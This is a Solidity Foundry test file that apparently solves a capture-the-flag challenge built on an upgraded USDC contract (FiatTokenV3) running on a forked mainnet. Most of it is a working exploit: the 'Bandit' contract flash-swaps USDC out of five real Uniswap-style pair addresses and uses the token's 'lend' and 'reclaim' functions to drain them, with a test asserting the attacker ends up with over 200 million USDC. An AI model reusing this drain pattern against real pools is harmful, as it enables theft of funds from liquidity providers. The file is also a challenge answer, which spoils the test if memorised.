pragma solidity 0.6.12;

import "../src/upgrade/FiatTokenV3.sol";
import "forge-std/Test.sol";

abstract contract ERC20Like {
    function balanceOf(address user) external virtual view returns (uint);
}

abstract contract FiatTokenProxyLike is ERC20Like {
    function changeAdmin(address newAdmin) external virtual;
    function admin() external virtual view returns(address);
    function upgradeTo(address newImplementation) external virtual;
}

//======================================================================================
//=======================VVVVVVPLAYER CONTRACTSVVVVVV===================================
//======================================================================================
abstract contract UniswapV2Pair {
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) virtual external;

    function token0() external virtual returns(address);
    function token1() external virtual returns(address);
}

contract Bandit {
    FiatTokenV3 USDC = FiatTokenV3(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    address[5] pairs = [
        0x004375Dff511095CC5A197A54140a24eFEF3A416,
        0xAE461cA67B15dc8dc81CE7615e0320dA1A9aB8D5,
        0x3041CbD36888bECc7bbCBc0045E3B1f144466f5f,
        0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc,
        0x397FF1542f962076d0BFE58eA045FfA2d347ACa0
    ];
    uint256 owed;
    
    function attack() external {
        bytes memory data;
        for(uint256 i=0; i<pairs.length; ++i) {
            uint256 toSwap = USDC.balanceOf(pairs[i]) - 1;
            if(UniswapV2Pair(pairs[i]).token0() == address(USDC)) {
                data = abi.encode(true);
                UniswapV2Pair(pairs[i]).swap(toSwap, 0, address(this), data);
            } else {
                data = abi.encode(false);
                UniswapV2Pair(pairs[i]).swap(0, toSwap, address(this), data);
            }
            USDC.reclaim(pairs[i], owed);
        }
        USDC.transfer(msg.sender, USDC.balanceOf(address(this)));
    }
    // Swap callback
    function uniswapV2Call(
        address,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        (bool isToken0) =
            abi.decode(data, (bool));

        uint256 fee;
        uint256 amountToRepay;

        if(isToken0) {
            fee = (amount0 * 3) / 997 + 1;
            amountToRepay = amount0 + fee;
        } else {
            fee = (amount1 * 3) / 997 + 1;
            amountToRepay = amount1 + fee;
        }
        owed = amountToRepay;
        USDC.lend(msg.sender, amountToRepay);
    }
}
//======================================================================================
//=======================^^^^^^PLAYER CONTRACTS^^^^^^===================================
//======================================================================================

contract Exploit is Test {
    FiatTokenProxyLike private constant USDC = FiatTokenProxyLike(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    address player = address(0xBaDa55);

    function setUp() external {
        vm.createSelectFork("https://rpc.ankr.com/eth", 11800000);

        FiatTokenV3 v3 = new FiatTokenV3();
        v3.initialize("", "", "", 0, address(0x01), address(0x01), address(0x01), address(0x01));
        v3.initializeV2("");
        v3.initializeV3();

        vm.prank(0x807a96288A1A408dBC13DE2b1d087d10356395d2);
        USDC.upgradeTo(address(v3));

        FiatTokenV3(address(USDC)).initializeV3();
    }

    function isSolved() public view returns (bool) {
        return USDC.balanceOf(player) > 200_000_000e6;
    }

    function testUpgradeExploit() public {
        vm.startPrank(player);
        Bandit bandit = new Bandit();
        // need to pay flash loan fees, consider it initial flash loan
        deal(address(USDC), address(bandit), 20_000e6);
        bandit.attack();
        
        require(isSolved(), "NOT SOLVED");
    }
}

